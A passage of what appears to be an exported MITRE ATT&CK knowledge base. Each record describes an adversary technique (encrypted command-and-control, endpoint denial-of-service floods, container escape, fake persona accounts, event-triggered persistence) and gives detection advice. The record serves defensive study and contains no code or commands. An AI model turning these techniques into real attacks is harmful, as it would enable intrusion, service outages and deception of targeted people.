{"ID":"T1573.001","name":"Encrypted Channel: Symmetric Cryptography","description":"Adversaries may employ a known symmetric encryption algorithm to conceal command and control traffic rather than relying on any inherent protections provided by a communication protocol. Symmetric encryption algorithms use the same key for plaintext encryption and ciphertext decryption. Common symmetric encryption algorithms include AES, DES, 3DES, Blowfish, and RC4.","url":"https://attack.mitre.org/techniques/T1573/001","created":"16 March 2020","last modified":"26 March 2020","version":"1.0","tactics":"Command and Control","detection":"With symmetric encryption, it may be possible to obtain the algorithm and key from samples and use them to decode network traffic to detect malware communications signatures.\n\nIn general, analyze network data for uncommon data flows (e.g., a client sending significantly more data than it receives from a server). Processes utilizing the network that do not normally have network communication or have never been seen before are suspicious. Analyze packet contents to detect communications that do not follow the expected protocol behavior for the port that is being used.(Citation: University of Birmingham C2)","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content","is sub-technique":true,"sub-technique of":"T1573","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Fidelis Hi-Zor),(Citation: Villeneuve 2011),(Citation: Nicolas Falliere, Liam O Murchu, Eric Chien February 2011),(Citation: Palo Alto Comnie),(Citation: Proofpoint Azorult July 2018),(Citation: FireEye Poison Ivy),(Citation: Kaspersky Dridex May 2017),(Citation: US-CERT BLINDINGCAN Aug 2020),(Citation: Securelist WhiteBear Aug 2017),(Citation: CISA AppleJeus Feb 2021),(Citation: McAfee Lazarus Nov 2020),(Citation: Kaspersky Carbanak),(Citation: ESET InvisiMole June 2018),(Citation: CISA MAR-10288834-2.v1  TAINTEDSCRIBE MAY 2020),(Citation: Talos Cobalt Strike September 2020),(Citation: ESET Okrum July 2019),(Citation: PWC Cloud Hopper Technical Annex April 2017),(Citation: McAfee Lazarus Jul 2020),(Citation: US-CERT BADCALL),(Citation: Unit 42 Lucifer June 2020),(Citation: Unit 42 Bisonal July 2018),(Citation: PaloAlto NanoCore Feb 2016),(Citation: Checkpoint IndigoZebra July 2021),(Citation: PWC WellMess C2 August 2020),(Citation: Lunghi Iron Tiger Linux),(Citation: Unit 42 PingPull Jun 2022),(Citation: ESET Sednit Part 2),(Citation: ESET Casbaneiro Oct 2019),(Citation: Trend Micro Iron Tiger April 2021),(Citation: Proofpoint Bumblebee April 2022),(Citation: McAfee Lazarus Resurfaces Feb 2018),(Citation: Talos Bisonal Mar 2020),(Citation: JPCert TSCookie March 2018),(Citation: Group IB GrimAgent July 2021),(Citation: Lotus Blossom Jun 2015),(Citation: US-CERT KEYMARBLE Aug 2018),(Citation: NCC Group Team9 June 2020),(Citation: Palo Alto Networks BBSRAT),(Citation: Symantec Hydraq Jan 2010),(Citation: JPCERT ChChes Feb 2017),(Citation: Securelist APT10 March 2021),(Citation: ESET PipeMon May 2020),(Citation: ClearSky Lebanese Cedar Jan 2021),(Citation: Check Point APT34 April 2021),(Citation: Fidelis TrickBot Oct 2016),(Citation: TrendMicro Patchwork Dec 2017),(Citation: MalwareBytes WoodyRAT Aug 2022),(Citation: Palo Alto MoonWind March 2017),(Citation: Rancor Unit42 June 2018),(Citation: Forcepoint Monsoon),(Citation: Unit42 BendyBear Feb 2021),(Citation: Mandiant No Easy Breach),(Citation: Novetta Blockbuster Destructive Malware),(Citation: ESET Machete July 2019),(Citation: Cisco H1N1 Part 2),(Citation: FireEye APT30),(Citation: Baumgartner Naikon 2015),(Citation: Bitdefender Naikon April 2021),(Citation: Red Canary NETWIRE January 2020),(Citation: Trend Micro Tick November 2019),(Citation: Talos MuddyWater Jan 2022),(Citation: SentinelLabs Metador Technical Appendix Sept 2022),(Citation: PWC WellMess July 2020),(Citation: PaloAlto CardinalRat Apr 2017),(Citation: Scarlet Mimic Jan 2016),(Citation: FireEye SUNBURST Backdoor December 2020),(Citation: Bitdefender APT28 Dec 2015),(Citation: US-CERT HOTCROISSANT February 2020),(Citation: FireEye APT28),(Citation: CrowdStrike Putter Panda),(Citation: ESET Dukes October 2019),(Citation: FireEye SMOKEDHAM June 2021),(Citation: FireEye APT10 April 2017),(Citation: Volexity Patchwork June 2018),(Citation: ESET Sednit Part 3),(Citation: Palo Alto menuPass Feb 2017),(Citation: Dell Sakula),(Citation: ESET GreyEnergy Oct 2018),(Citation: Proofpoint TA416 Europe March 2022),(Citation: GitHub Sliver Encryption),(Citation: Kaspersky Cloud Atlas December 2014),(Citation: Recorded Future REDDELTA July 2020),(Citation: TrendMicro Taidoor),(Citation: Moran 2014),(Citation: Nccgroup Gh0st April 2018),(Citation: Malwarebytes KONNI Evolves Jan 2022),(Citation: Fidelis Turbo),(Citation: Novetta Blockbuster),(Citation: Check Point Warzone Feb 2020),(Citation: Forcepoint Felismus Mar 2017),(Citation: ESET ForSSHe December 2018),(Citation: CheckPoint Bandook Nov 2020),(Citation: Symantec W32.Duqu),(Citation: ESET Attor Oct 2019),(Citation: Sofacy Komplex Trojan),(Citation: Proofpoint ZeroT Feb 2017),(Citation: Kaspersky CactusPete Aug 2020),(Citation: ESET Zebrocy May 2019),(Citation: ESET Gazer Aug 2017),(Citation: Kaspersky Turla),(Citation: CrowdStrike IceApple May 2022),(Citation: Citizen Lab Stealth Falcon May 2016),(Citation: F-Secure Cosmicduke),(Citation: FireEye APT29),(Citation: ESET Kobalos Jan 2021),(Citation: Unit42 RDAT July 2020),(Citation: SentinelLabs Metador Sept 2022),(Citation: Proofpoint TA459 April 2017),(Citation: Microsoft PLATINUM April 2016),(Citation: Novetta Winnti April 2015),(Citation: ESET Kobalos Feb 2021),(Citation: Chaos Stolen Backdoor),(Citation: Lotus Blossom Dec 2015),(Citation: Unit 42 SeaDuke 2015),(Citation: Zscaler APT31 Covid-19 October 2020),(Citation: ESET LightNeuron May 2019),(Citation: trendmicro xcsset xcode project 2020),(Citation: Novetta-Axiom),(Citation: JPCert PLEAD Downloader June 2018),(Citation: Kaspersky QakBot September 2021),(Citation: CISA WellMess July 2020),(Citation: FireEye APT33 Guardrail),(Citation: Check Point APT35 CharmPower January 2022),(Citation: ESET Ebury Feb 2014),(Citation: BlackBerry CostaRicto November 2020),(Citation: Microsoft DUBNIUM July 2016),(Citation: ESET Operation Groundbait),(Citation: US-CERT FALLCHILL Nov 2017),(Citation: ESET Turla Mosquito Jan 2018),(Citation: Secureworks BRONZE BUTLER Oct 2017),(Citation: Cybereason StrifeWater Feb 2022),(Citation: CISA MAR-10292089-1.v2 TAIDOOR August 2021),(Citation: Palo Alto OilRig May 2016),(Citation: Talos Frankenstein June 2019),(Citation: Zscaler Higaisa 2020),(Citation: Intezer HiddenWasp Map 2019),(Citation: Carbon Black HotCroissant April 2020),(Citation: ESET RTM Feb 2017),(Citation: MSTIC FoggyWeb September 2021),(Citation: GitHub QuasarRAT),(Citation: US-CERT Volgmer 2 Nov 2017),(Citation: Security Intelligence More Eggs Aug 2019),(Citation: Accenture HyperStack October 2020),(Citation: Chronicle Winnti for Linux May 2019),(Citation: FireEye APT10 Sept 2018),(Citation: Proofpoint TA505 Mar 2018),(Citation: SentinelOne Aoqin Dragon June 2022),(Citation: CISA AR18-352A Quasar RAT December 2018),(Citation: Unit42 Azorult Nov 2018),(Citation: Proofpoint LookBack Malware Aug 2019),(Citation: FireEye CARBANAK June 2017),(Citation: Bitdefender Trickbot C2 infra Nov 2020),(Citation: McAfee GhostSecret),"}
{"ID":"T1499","name":"Endpoint Denial of Service","description":"Adversaries may perform Endpoint Denial of Service (DoS) attacks to degrade or block the availability of services to users. Endpoint DoS can be performed by exhausting the system resources those services are hosted on or exploiting the system to cause a persistent crash condition. Example services include websites, email services, DNS, and web-based applications. Adversaries have been observed conducting DoS attacks for political purposes(Citation: FireEye OpPoisonedHandover February 2016) and to support other malicious activities, including distraction(Citation: FSISAC FraudNetDoS September 2012), hacktivism, and extortion.(Citation: Symantec DDoS October 2014)\n\nAn Endpoint DoS denies the availability of a service without saturating the network used to provide access to the service. Adversaries can target various layers of the application stack that is hosted on the system used to provide the service. These layers include the Operating Systems (OS), server applications such as web servers, DNS servers, databases, and the (typically web-based) applications that sit on top of them. Attacking each layer requires different techniques that take advantage of bottlenecks that are unique to the respective components. A DoS attack may be generated by a single system or multiple systems spread across the internet, which is commonly referred to as a distributed DoS (DDoS).\n\nTo perform DoS attacks against endpoint resources, several aspects apply to multiple methods, including IP address spoofing and botnets.\n\nAdversaries may use the original IP address of an attacking system, or spoof the source IP address to make the attack traffic more difficult to trace back to the attacking system or to enable reflection. This can increase the difficulty defenders have in defending against the attack by reducing or eliminating the effectiveness of filtering by the source address on network defense devices.\n\nBotnets are commonly used to conduct DDoS attacks against networks and services. Large botnets can generate a significant amount of traffic from systems spread across the global internet. Adversaries may have the resources to build out and control their own botnet infrastructure or may rent time on an existing botnet to conduct an attack. In some of the worst cases for DDoS, so many systems are used to generate requests that each one only needs to send out a small amount of traffic to produce enough volume to exhaust the target's resources. In such circumstances, distinguishing DDoS traffic from legitimate clients becomes exceedingly difficult. Botnets have been used in some of the most high-profile DDoS attacks, such as the 2012 series of incidents that targeted major US banks.(Citation: USNYAG IranianBotnet March 2016)\n\nIn cases where traffic manipulation is used, there may be points in the global network (such as high traffic gateway routers) where packets can be altered and cause legitimate clients to execute code that directs network packets toward a target in high volume. This type of capability was previously used for the purposes of web censorship where client HTTP traffic was modified to include a reference to JavaScript that generated the DDoS code to overwhelm target web servers.(Citation: ArsTechnica Great Firewall of China)\n\nFor attacks attempting to saturate the providing network, see [Network Denial of Service](https://attack.mitre.org/techniques/T1498).\n","url":"https://attack.mitre.org/techniques/T1499","created":"18 April 2019","last modified":"30 March 2023","version":"1.1","tactics":"Impact","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.","platforms":"Azure AD, Containers, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Oliveira, Trend Micro; David Fiser, @anu4is, Trend Micro; Magno Logan, @magnologan, Trend Micro; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team","permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: FireEye APT41 Aug 2019),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ESET Dukes October 2019),(Citation: Talos ZxShell Oct 2014),(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1499.003","name":"Endpoint Denial of Service: Application Exhaustion Flood","description":"Adversaries may target resource intensive features of applications to cause a denial of service (DoS), denying availability to those applications. For example, specific features in web applications may be highly resource intensive. Repeated requests to those features may be able to exhaust system resources and deny access to the application or the server itself.(Citation: Arbor AnnualDoSreport Jan 2018)","url":"https://attack.mitre.org/techniques/T1499/003","created":"20 February 2020","last modified":"25 March 2022","version":"1.2","tactics":"Impact","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1499","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":",(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1499.004","name":"Endpoint Denial of Service: Application or System Exploitation","description":"Adversaries may exploit software vulnerabilities that can cause an application or system to crash and deny availability to users. (Citation: Sucuri BIND9 August 2015) Some systems may automatically restart critical applications and services when crashes occur, but they can likely be re-exploited to cause a persistent denial of service (DoS) condition.\n\nAdversaries may exploit known or zero-day vulnerabilities to crash applications and/or systems, which may also lead to dependent applications and/or systems to be in a DoS condition. Crashed or restarted applications or systems may also have other effects such as [Data Destruction](https://attack.mitre.org/techniques/T1485), [Firmware Corruption](https://attack.mitre.org/techniques/T1495), [Service Stop](https://attack.mitre.org/techniques/T1489) etc. which may further cause a DoS condition and deny availability to critical information, applications and/or systems. ","url":"https://attack.mitre.org/techniques/T1499/004","created":"20 February 2020","last modified":"25 March 2022","version":"1.2","tactics":"Impact","detection":"Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack. Externally monitor the availability of services that may be targeted by an Endpoint DoS.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1499","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":"(Citation: ESET Industroyer),(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1499.001","name":"Endpoint Denial of Service: OS Exhaustion Flood","description":"Adversaries may launch a denial of service (DoS) attack targeting an endpoint's operating system (OS). A system's OS is responsible for managing the finite resources as well as preventing the entire system from being overwhelmed by excessive demands on its capacity. These attacks do not need to exhaust the actual resources on a system; the attacks may simply exhaust the limits and available resources that an OS self-imposes.\n\nDifferent ways to achieve this exist, including TCP state-exhaustion attacks such as SYN floods and ACK floods.(Citation: Arbor AnnualDoSreport Jan 2018) With SYN floods, excessive amounts of SYN packets are sent, but the 3-way TCP handshake is never completed. Because each OS has a maximum number of concurrent TCP connections that it will allow, this can quickly exhaust the ability of the system to receive new requests for TCP connections, thus preventing access to any TCP service provided by the server.(Citation: Cloudflare SynFlood)\n\nACK floods leverage the stateful nature of the TCP protocol. A flood of ACK packets are sent to the target. This forces the OS to search its state table for a related TCP connection that has already been established. Because the ACK packets are for connections that do not exist, the OS will have to search the entire state table to confirm that no match exists. When it is necessary to do this for a large flood of packets, the computational requirements can cause the server to become sluggish and/or unresponsive, due to the work it must do to eliminate the rogue ACK packets. This greatly reduces the resources available for providing the targeted service.(Citation: Corero SYN-ACKflood)","url":"https://attack.mitre.org/techniques/T1499/001","created":"20 February 2020","last modified":"30 March 2023","version":"1.2","tactics":"Impact","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.","platforms":"Linux, Windows, macOS","data sources":"Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1499","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":",(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1499.002","name":"Endpoint Denial of Service: Service Exhaustion Flood","description":"Adversaries may target the different network services provided by systems to conduct a denial of service (DoS). Adversaries often target the availability of DNS and web services, however others have been targeted as well.(Citation: Arbor AnnualDoSreport Jan 2018) Web server software can be attacked through a variety of means, some of which apply generally while others are specific to the software being used to provide the service.\n\nOne example of this type of attack is known as a simple HTTP flood, where an adversary sends a large number of HTTP requests to a web server to overwhelm it and/or an application that runs on top of it. This flood relies on raw volume to accomplish the objective, exhausting any of the various resources required by the victim software to provide the service.(Citation: Cloudflare HTTPflood)\n\nAnother variation, known as a SSL renegotiation attack, takes advantage of a protocol feature in SSL/TLS. The SSL/TLS protocol suite includes mechanisms for the client and server to agree on an encryption algorithm to use for subsequent secure connections. If SSL renegotiation is enabled, a request can be made for renegotiation of the crypto algorithm. In a renegotiation attack, the adversary establishes a SSL/TLS connection and then proceeds to make a series of renegotiation requests. Because the cryptographic renegotiation has a meaningful cost in computation cycles, this can cause an impact to the availability of the service when done in volume.(Citation: Arbor SSLDoS April 2012)","url":"https://attack.mitre.org/techniques/T1499/002","created":"20 February 2020","last modified":"30 March 2023","version":"1.3","tactics":"Impact","detection":"Detection of Endpoint DoS can sometimes be achieved before the effect is sufficient to cause significant impact to the availability of the service, but such response time typically requires very aggressive monitoring and responsiveness. Typical network throughput monitoring tools such as netflow, SNMP, and custom scripts can be used to detect sudden increases in circuit utilization.(Citation: Cisco DoSdetectNetflow) Real-time, automated, and qualitative study of the network traffic can identify a sudden surge in one type of protocol can be used to detect an attack as it starts.\n\nIn addition to network level detections, endpoint logging and instrumentation can be useful for detection. Attacks targeting web applications may generate logs in the web server, application server, and/or database server that can be used to identify the type of attack, possibly before the impact is felt.\n\nExternally monitor the availability of services that may be targeted by an Endpoint DoS.","platforms":"Azure AD, Google Workspace, IaaS, Linux, Office 365, SaaS, Windows, macOS","data sources":"Application Log: Application Log Content, Network Traffic: Network Traffic Content, Network Traffic: Network Traffic Flow, Sensor Health: Host Status","is sub-technique":true,"sub-technique of":"T1499","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":"Availability","effective permissions":null,"relationship citations":",(Citation: CERT-EU DDoS March 2017)"}
{"ID":"T1611","name":"Escape to Host","description":"Adversaries may break out of a container to gain access to the underlying host. This can allow an adversary access to other containerized resources from the host level or to the host itself. In principle, containerized resources should provide a clear separation of application functionality and be isolated from the host environment.(Citation: Docker Overview)\n\nThere are multiple ways an adversary may escape to a host environment. Examples include creating a container configured to mount the host’s filesystem using the bind parameter, which allows the adversary to drop payloads and execute control utilities such as cron on the host; utilizing a privileged container to run commands or load a malicious kernel module on the underlying host; or abusing system calls such as `unshare` and `keyctl` to escalate privileges and steal secrets.(Citation: Docker Bind Mounts)(Citation: Trend Micro Privileged Container)(Citation: Intezer Doki July 20)(Citation: Container Escape)(Citation: Crowdstrike Kubernetes Container Escape)(Citation: Keyctl-unmask)\n\nAdditionally, an adversary may be able to exploit a compromised container with a mounted container management socket, such as `docker.sock`, to break out of the container via a [Container Administration Command](https://attack.mitre.org/techniques/T1609).(Citation: Container Escape) Adversaries may also escape via [Exploitation for Privilege Escalation](https://attack.mitre.org/techniques/T1068), such as exploiting vulnerabilities in global symbolic links in order to access the root directory of a host machine.(Citation: Windows Server Containers Are Open)\n\nGaining access to the host may provide the adversary with the opportunity to achieve follow-on objectives, such as establishing persistence, moving laterally within the environment, or setting up a command and control channel on the host.","url":"https://attack.mitre.org/techniques/T1611","created":"30 March 2021","last modified":"15 April 2023","version":"1.4","tactics":"Privilege Escalation","detection":"Monitor for the deployment of suspicious or unknown container images and pods in your environment, particularly containers running as root. Additionally, monitor for unexpected usage of syscalls such as <code>mount</code> (as well as resulting process activity) that may indicate an attempt to escape from a privileged container to host. In Kubernetes, monitor for cluster-level events associated with changing containers' volume configurations.","platforms":"Containers, Linux, Windows","data sources":"Container: Container Creation, Kernel: Kernel Module Load, Process: OS API Execution, Process: Process Creation, Volume: Volume Modification","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":"Alfredo Oliveira, Trend Micro; Ariel Shuper, Cisco; CrowdStrike; Daniel Prizmant, Palo Alto Networks; David Fiser, @anu4is, Trend Micro; Eran Ayalon, Cybereason; Idan Frimark, Cisco; Ilan Sokol, Cybereason; Joas Antonio dos Santos, @C0d3Cr4zy, Inmetrics; Magno Logan, @magnologan, Trend Micro; Oren Ofer, Cybereason; Vishwas Manral, McAfee; Yossi Weizman, Azure Defender Research Team; Yuval Avrahami, Palo Alto Networks","permissions required":"Administrator, root, User","supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Aqua TeamTNT August 2020),(Citation: Unit 42 Hildegard Malware),(Citation: Peirates GitHub),(Citation: Intezer Doki July 20),(Citation: Unit 42 Siloscape Jun 2021),(Citation: Intezer TeamTNT September 2020),(Citation: Kubernetes Security Context),(Citation: Kubernetes Hardening Guide)"}
{"ID":"T1585","name":"Establish Accounts","description":"Adversaries may create and cultivate accounts with services that can be used during targeting. Adversaries can create accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations. This development could be applied to social media, website, or other publicly available information that could be referenced and scrutinized for legitimacy over the course of an operation using that persona or identity.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of an online persona may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single site or across multiple sites (ex: Facebook, LinkedIn, Twitter, Google, GitHub, Docker Hub, etc.). Establishing a persona may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nEstablishing accounts can also include the creation of accounts with email providers, which may be directly leveraged for [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1)","url":"https://attack.mitre.org/techniques/T1585","created":"01 October 2020","last modified":"16 October 2021","version":"1.2","tactics":"Resource Development","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nMuch of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content, Persona: Social Media","is sub-technique":false,"sub-technique of":null,"defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Check Point Pay2Key November 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: FireEye APT17),"}
{"ID":"T1585.003","name":"Establish Accounts: Cloud Accounts","description":"Adversaries may create accounts with cloud providers that can be used during targeting. Adversaries can use cloud accounts to further their operations, including leveraging cloud storage services such as Dropbox, MEGA, Microsoft OneDrive, or AWS S3 buckets for [Exfiltration to Cloud Storage](https://attack.mitre.org/techniques/T1567/002) or to [Upload Tool](https://attack.mitre.org/techniques/T1608/002)s. Cloud accounts can also be used in the acquisition of infrastructure, such as [Virtual Private Server](https://attack.mitre.org/techniques/T1583/003)s or [Serverless](https://attack.mitre.org/techniques/T1583/007) infrastructure. Establishing cloud accounts may allow adversaries to develop sophisticated capabilities without managing their own servers.(Citation: Awake Security C2 Cloud)\n\nCreating [Cloud Accounts](https://attack.mitre.org/techniques/T1585/003) may also require adversaries to establish [Email Accounts](https://attack.mitre.org/techniques/T1585/002) to register with the cloud provider. ","url":"https://attack.mitre.org/techniques/T1585/003","created":"27 May 2022","last modified":"25 October 2022","version":"1.1","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during exfiltration (ex: [Transfer Data to Cloud Account](https://attack.mitre.org/techniques/T1537)).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1585","defenses bypassed":null,"contributors":"Francesco Bigarella","permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":","}
{"ID":"T1585.002","name":"Establish Accounts: Email Accounts","description":"Adversaries may create email accounts that can be used during targeting. Adversaries can use accounts created with email providers to further their operations, such as leveraging them to conduct [Phishing for Information](https://attack.mitre.org/techniques/T1598) or [Phishing](https://attack.mitre.org/techniques/T1566).(Citation: Mandiant APT1) Adversaries may also take steps to cultivate a persona around the email account, such as through use of [Social Media Accounts](https://attack.mitre.org/techniques/T1585/001), to increase the chance of success of follow-on behaviors. Created email accounts can also be used in the acquisition of infrastructure (ex: [Domains](https://attack.mitre.org/techniques/T1583/001)).(Citation: Mandiant APT1)\n\nTo decrease the chance of physically tying back operations to themselves, adversaries may make use of disposable email services.(Citation: Trend Micro R980 2016)","url":"https://attack.mitre.org/techniques/T1585/002","created":"01 October 2020","last modified":"15 April 2021","version":"1.0","tactics":"Resource Development","detection":"Much of this activity will take place outside the visibility of the target organization, making detection of this behavior difficult. Detection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Phishing](https://attack.mitre.org/techniques/T1566)).","platforms":"PRE","data sources":null,"is sub-technique":true,"sub-technique of":"T1585","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: Bitdefender FunnyDream Campaign November 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: Cylance Dust Storm),(Citation: ESET Lazarus Jun 2020),(Citation: Kaspersky Lyceum October 2021),(Citation: Mandiant APT1),(Citation: KISA Operation Muzabi),(Citation: Kaspersky ThreatNeedle Feb 2021),(Citation: DOJ Iran Indictments March 2018),(Citation: Proofpoint TA453 March 2021),(Citation: Google EXOTIC LILY March 2022),(Citation: Proofpoint TA416 Europe March 2022),(Citation: FoxIT Wocao December 2019),(Citation: CISA AA21-200A APT40 July 2021),(Citation: IBM ITG18 2020),(Citation: McAfee Honeybee),"}
{"ID":"T1585.001","name":"Establish Accounts: Social Media Accounts","description":"Adversaries may create and cultivate social media accounts that can be used during targeting. Adversaries can create social media accounts that can be used to build a persona to further operations. Persona development consists of the development of public information, presence, history and appropriate affiliations.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage)\n\nFor operations incorporating social engineering, the utilization of a persona on social media may be important. These personas may be fictitious or impersonate real people. The persona may exist on a single social media site or across multiple sites (ex: Facebook, LinkedIn, Twitter, etc.). Establishing a persona  on social media may require development of additional documentation to make them seem real. This could include filling out profile information, developing social networks, or incorporating photos. \n\nOnce a persona has been developed an adversary can use it to create connections to targets of interest. These connections may be direct or may include trying to connect through others.(Citation: NEWSCASTER2014)(Citation: BlackHatRobinSage) These accounts may be leveraged during other phases of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).","url":"https://attack.mitre.org/techniques/T1585/001","created":"01 October 2020","last modified":"16 October 2021","version":"1.1","tactics":"Resource Development","detection":"Consider monitoring social media activity related to your organization. Suspicious activity may include personas claiming to work for your organization or recently created/modified accounts making numerous connection requests to accounts affiliated with your organization.\n\nDetection efforts may be focused on related stages of the adversary lifecycle, such as during Initial Access (ex: [Spearphishing via Service](https://attack.mitre.org/techniques/T1566/003)).","platforms":"PRE","data sources":"Network Traffic: Network Traffic Content, Persona: Social Media","is sub-technique":true,"sub-technique of":"T1585","defenses bypassed":null,"contributors":null,"permissions required":null,"supports remote":null,"system requirements":null,"impact type":null,"effective permissions":null,"relationship citations":"(Citation: ClearSky Kittens Back 3 August 2020),(Citation: US District Court Indictment GRU Unit 74455 October 2020),(Citation: ESET Lazarus Jun 2020),(Citation: ClearSky Pay2Kitten December 2020),(Citation: KISA Operation Muzabi),(Citation: ClearSky Siamesekitten August 2021),(Citation: ESET Dukes October 2019),(Citation: Google TAG Lazarus Jan 2021),(Citation: Microsoft Iranian Threat Actor Trends November 2021),(Citation: Volexity Ocean Lotus November 2020),(Citation: Google EXOTIC LILY March 2022),(Citation: ClearSky Lazarus Aug 2020),(Citation: CISA AA21-200A APT40 July 2021),(Citation: Dell Threat Group 2889),"}
{"ID":"T1546","name":"Event Triggered Execution","description":"Adversaries may establish persistence and/or elevate privileges using system mechanisms that trigger execution based on specific events. Various operating systems have means to monitor and subscribe to events such as logons or other user activity such as running specific applications/binaries. Cloud environments may also support various functions and services that monitor and can be invoked in response to specific cloud events.(Citation: Backdooring an AWS account)(Citation: Varonis Power Automate Data Exfiltration)(Citation: Microsoft DART Case Report 001)\n\nAdversaries may abuse these mechanisms as a means of maintaining persistent access to a victim via repeatedly executing malicious code. After gaining access to a victim system, adversaries may create/modify event triggers to point to malicious content that will be executed whenever the event trigger is invoked.(Citation: FireEye WMI 2015)(Citation: Malware Persistence on OS X)(Citation: amnesia malware)\n\nSince the execution can be proxied by an account with higher permissions, such as SYSTEM or service accounts, an adversary may be able to abuse these triggered execution mechanisms to escalate their privileges. ","url":"https://attack.mitre.org/techniques/T1546","created":"22 January 2020","last modified":"19 October 2022","version":"1.2","tactics":"Persistence, Privilege Escalation","detection":"Monitoring for additions or modifications of mechanisms that could be used to trigger event-based execution, especially the addition of abnormal commands such as execution of unknown programs, opening network sockets, or reaching out across the network. Also look for changes that do not line up with updates, patches, or other planned administrative activity. \n\nThese mechanisms may vary by OS, but are typically stored in central repositories that store configuration information such as the Windows Registry, Common Information Model (CIM), and/or specific named files, the last of which can be hashed and compared to known good values. \n\nMonitor for processes, API/System calls, and other common ways of manipulating these event repositories. \n\nTools such as Sysinternals Autoruns can be used to detect changes to execution triggers that could be attempts at persistence. Also look for abnormal process call trees for execution of other commands that could relate to Discovery actions or other techniques.  \n\nMonitor DLL loads by processes, specifically looking for DLLs that are not recognized or not 